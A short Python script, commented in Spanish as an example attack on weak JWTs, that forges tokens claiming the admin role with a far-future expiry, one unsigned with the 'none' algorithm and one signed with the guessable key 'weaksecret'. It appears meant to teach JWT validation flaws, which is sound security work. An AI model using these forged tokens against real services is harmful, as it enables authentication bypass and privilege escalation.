import jwt

# Ejemplo de ataque a JWT débil
payload = {"username": "admin", "role": "admin", "exp": 9999999999}

# Token con algoritmo "none"
token_none = jwt.encode(payload, "", algorithm="none")
print("JWT con algoritmo none:", token_none)

# Token con clave débil
token_weak = jwt.encode(payload, "weaksecret", algorithm="HS256")
print("JWT con clave débil:", token_weak)
